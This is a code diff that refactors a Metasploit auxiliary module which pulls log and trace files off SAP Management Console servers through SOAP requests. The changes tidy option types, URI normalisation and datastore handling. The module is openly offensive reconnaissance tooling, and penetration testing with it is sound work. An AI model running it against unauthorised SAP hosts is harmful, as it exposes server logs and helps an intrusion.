@@ -16,7 +16,6 @@ class Metasploit4 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'         => 'SAP Management Console Get Logfile',
-			'Version'      => '$Revision$',
 			'Description'  => %q{
 				This module simply attempts to download available logfiles and
 				developer tracefiles through the SAP Management Console SOAP
@@ -41,8 +40,8 @@ class Metasploit4 < Msf::Auxiliary
 				Opt::RPORT(50013),
 				OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
 				OptString.new('RFILE', [ true, 'The name of the file to download ', 'sapstart.log']),
-				OptString.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE']),
-				OptString.new('GETALL', [ false, 'Download all available files (WARNING: may take long!)', 'false']),
+				OptEnum.new('FILETYPE', [true, 'Specify LOGFILE or TRACEFILE', 'TRACEFILE', ['TRACEFILE','LOGFILE']]),
+				OptBool.new('GETALL', [ false, 'Download all available files (WARNING: may take a long time!)', false])
 			], self.class)
 		register_autofilter_ports([ 50013 ])
 		deregister_options('RHOST')
@@ -54,7 +53,7 @@ class Metasploit4 < Msf::Auxiliary
 
 	def run_host(ip)
 		res = send_request_cgi({
-			'uri'      => "/#{datastore['URI']}",
+			'uri'      => normalize_uri(datastore['URI']),
 			'method'   => 'GET'
 		}, 25)
 
@@ -62,7 +61,7 @@ class Metasploit4 < Msf::Auxiliary
 			print_error("#{rhost}:#{rport} [SAP] Unable to connect")
 			return
 		end
-		if "#{datastore['GETALL']}" == 'true'
+		if datastore['GETALL']
 			listfiles(ip)
 		else
 			gettfiles(rhost,"#{datastore['RFILE']}",'')
@@ -78,7 +77,7 @@ class Metasploit4 < Msf::Auxiliary
 		xs = 'http://www.w3.org/2001/XMLSchema'
 		sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
 
-		case "#{datastore['FILETYPE']}"
+		case datastore['FILETYPE'].to_s
 		when /^LOG/i
 			ns1 = 'ns1:ListLogFiles'
 		when /^TRACE/i
@@ -102,7 +101,7 @@ class Metasploit4 < Msf::Auxiliary
 
 		begin
 			res = send_request_raw({
-				'uri'      => "/#{datastore['URI']}",
+				'uri'      => normalize_uri(datastore['URI']),
 				'method'   => 'POST',
 				'data'     => data,
 				'headers'  =>
@@ -167,7 +166,7 @@ class Metasploit4 < Msf::Auxiliary
 		xs = 'http://www.w3.org/2001/XMLSchema'
 		sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
 
-		case "#{datastore['FILETYPE']}"
+		case datastore['FILETYPE'].to_s
 		when /^LOG/i
 			ns1 = 'ns1:ReadLogFile'
 		when /^TRACE/i
@@ -191,7 +190,7 @@ class Metasploit4 < Msf::Auxiliary
 
 		begin
 			res = send_request_raw({
-				'uri'      => "/#{datastore['URI']}",
+				'uri'      => normalize_uri(datastore['URI']),
 				'method'   => 'POST',
 				'data'     => data,
 				'headers'  =>
